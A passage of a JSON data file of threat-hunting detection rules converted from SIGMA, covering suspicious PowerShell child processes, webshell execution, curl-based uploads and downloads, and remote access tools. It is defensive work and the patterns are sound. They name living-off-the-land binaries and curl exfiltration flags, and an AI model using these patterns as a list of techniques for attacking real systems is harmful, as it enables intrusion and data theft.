            "confidence": 2,
            "description": "Detects potentially suspicious child processes spawned by PowerShell.\nUse this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potentially Suspicious PowerShell Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell_ise.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not ((tgt.process.image.path contains \"\\certutil.exe\" and tgt.process.cmdline contains \"-verifystore \") or (tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"qfe list\" or tgt.process.cmdline contains \"diskdrive \" or tgt.process.cmdline contains \"csproduct \" or tgt.process.cmdline contains \"computersystem \" or tgt.process.cmdline contains \" os \" or tgt.process.cmdline contains \"\")))) and (not (src.process.cmdline contains \"\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\\" and tgt.process.cmdline contains \"\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 73
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"schtasks.exe\" from a parent that is located in a potentially suspicious location.\nMultiple malware strains were seen exhibiting a similar behavior in order to achieve persistence.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Scheduled Task Creation From Potential Suspicious Parent Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \":\\Temp\\\" or src.process.image.path contains \"\\AppData\\Local\\\" or src.process.image.path contains \"\\AppData\\Roaming\\\" or src.process.image.path contains \"\\Temporary Internet\" or src.process.image.path contains \"\\Users\\Public\\\" or src.process.image.path contains \"\\Windows\\Temp\\\") and tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (not (tgt.process.cmdline contains \"update_task.xml\" or tgt.process.cmdline contains \"unattended.ini\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 74
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a program executing from a web server root folder. Use this rule to hunt for potential interesting activity such as webshell or backdoors\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Execution From Webserver Root Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wwwroot\\\" or tgt.process.image.path contains \"\\wmpub\\\" or tgt.process.image.path contains \"\\htdocs\\\") and (not ((tgt.process.image.path contains \"bin\\\" or tgt.process.image.path contains \"\\Tools\\\" or tgt.process.image.path contains \"\\SMSComponent\\\") and src.process.image.path contains \"\\services.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 75
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Action1 in order to execute arbitrary code or establish a remote session.\n\nAction1 is a powerful Remote Monitoring and Management tool that enables users to execute commands, scripts, and binaries.\nThrough the web interface of action1, the administrator must create a new policy or an app to establish remote execution and then points that the agent is installed.\n\nHunting Opportunity 1- Weed Out The Noise\n\nWhen threat actors execute a script, a command, or a binary through these new policies and apps, the names of these become visible in the command line during the execution process. Below is an example of the command line that contains the deployment of a binary through  a policy with name \"test_app_1\":\n\nParentCommandLine: \"C:\\WINDOWS\\Action1\\action1_agent.exe schedule:Deploy_App__test_app_1_1681327673425 runaction:0\"\n\nAfter establishing a baseline, we can split the command to extract the policy name and group all the policy names and inspect the results with a list of frequency occurrences.\n\nHunting Opportunity 2 - Remote Sessions On Out Of Office Hours\n\nIf you have admins within your environment using remote sessions to administer endpoints, you can create a threat-hunting query and modify the time of the initiated sessions looking for abnormal activity.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Action1 Arbitrary Code Execution and Remote Sessions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\action1_agent.exe\" and tgt.process.image.path contains \"\\Windows\\Action1\\package_downloads\\\") or ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\") and (src.process.cmdline contains \"\\Action1\\scripts\\Run_Command_\" or src.process.cmdline contains \"\\Action1\\scripts\\Run_PowerShell_\")) or tgt.process.image.path contains \"\\agent1_remote.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 76
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"curl\" process with \"upload\" flags. Which might indicate potential data exfiltration",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567",
                "t1105"
            ],
            "name": "Potential Data Exfiltration Via Curl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and ((tgt.process.cmdline contains \" --form\" or tgt.process.cmdline contains \" --upload-file \" or tgt.process.cmdline contains \" --data \" or tgt.process.cmdline contains \" --data-\") or tgt.process.cmdline matches \"\\\\s-[FTd]\\\\s\")) and (not (tgt.process.cmdline contains \"://localhost\" or tgt.process.cmdline contains \"://127.0.0.1\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 77
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential suspicious execution of a GUID like folder name located in a suspicious location such as %TEMP% as seen being used in IcedID attacks.\nUse this rule to hunt for potentially suspicious activity stemming from uncommon folders.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Potential Suspicious Execution From GUID Like Folder Names",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\") and (tgt.process.cmdline contains \"\\{\" and tgt.process.cmdline contains \"}\\\")) and (not ((tgt.process.image.path contains \"\\{\" and tgt.process.image.path contains \"}\\\") or not (tgt.process.image.path matches \"\\.*\") or tgt.process.image.path=\"C:\\Windows\\System32\\drvinst.exe\" or (tgt.process.image.path in (\"C:\\Windows\\System32\\msiexec.exe\",\"C:\\Windows\\SysWOW64\\msiexec.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 78
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of curl.exe with custom useragent options",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Curl.EXE Execution With Custom UserAgent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and (tgt.process.cmdline contains \" -A \" or tgt.process.cmdline contains \" --user-agent \"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 79
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of software that is related to the University of California, Berkeley via metadata information.\nThis indicates it may be related to BOINC software and can be used maliciously if unauthorized.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Potential BOINC Software Execution (UC-Berkeley Signature)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.displayName=\"University of California, Berkeley\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 80
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects remote binary or command execution via the ScreenConnect Service.\nUse this rule in order to hunt for potentially anomalous executions originating from ScreenConnect\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - ScreenConnect Remote Command Execution - Hunting",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\ScreenConnect.ClientService.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 81
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects file download using curl.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download Via Curl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and (tgt.process.cmdline contains \" -O\" or tgt.process.cmdline contains \"--remote-name\" or tgt.process.cmdline contains \"--output\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 82
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Dynamic .NET Compilation Via Csc.EXE - Hunting",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csc.exe\" and tgt.process.cmdline contains \"/noconfig /fullpaths @\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 83
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a curl process start on Windows, which could indicates a file download from a remote location or a simple web request to a remote server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Curl.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 84
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract cab using the \"/extract\" argument that is no longer supported.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cab File Extraction Via Wusa.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wusa.exe\" and tgt.process.cmdline contains \"/extract:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 85
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious New Instance Of An Office COM Object",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and (tgt.process.image.path contains \"\\eqnedt32.exe\" or tgt.process.image.path contains \"\\excel.exe\" or tgt.process.image.path contains \"\\msaccess.exe\" or tgt.process.image.path contains \"\\mspub.exe\" or tgt.process.image.path contains \"\\powerpnt.exe\" or tgt.process.image.path contains \"\\visio.exe\" or tgt.process.image.path contains \"\\winword.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 86
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This is a threat-hunting query to collect information related to the interactive execution of a script from inside a compressed file (zip/rar). Windows will automatically run the script using scripting interpreters such as wscript and cscript binaries.\n\nFrom the query below, the child process is the script interpreter that will execute the script. The script extension is also a set of standard extensions that Windows OS recognizes. Selections 1-3 contain three different execution scenarios.\n    1. Compressed file opened using 7zip.\n    2. Compressed file opened using WinRar.\n    3. Compressed file opened using native windows File Explorer capabilities.\n\nWhen the malicious script is double-clicked, it will be extracted to the respected directories as signified by the CommandLine on each of the three Selections. It will then be executed using the relevant script interpreter.\"\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Manual Execution of Script Inside of a Compressed File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path=\"*\\7z*.exe\" and tgt.process.cmdline=\"*\\AppData\\local\\temp\\7z*\\*\") or (src.process.image.path contains \"\\winrar.exe\" and tgt.process.cmdline=\"*\\AppData\\local\\temp\\rar*\\*\") or (src.process.image.path contains \"\\explorer.exe\" and (tgt.process.cmdline contains \"\\AppData\\local\\temp\\*.rar\\\" or tgt.process.cmdline contains \"\\AppData\\local\\temp\\*.zip\\\"))) and ((tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") and (tgt.process.cmdline contains \".hta\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".jse\" or tgt.process.cmdline contains \".ps1\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".wsf\" or tgt.process.cmdline contains \".wsh\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 87
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a file or folder's permissions being modified or tampered with.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1222"
            ],
            "name": "File or Folder Permissions Modifications",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
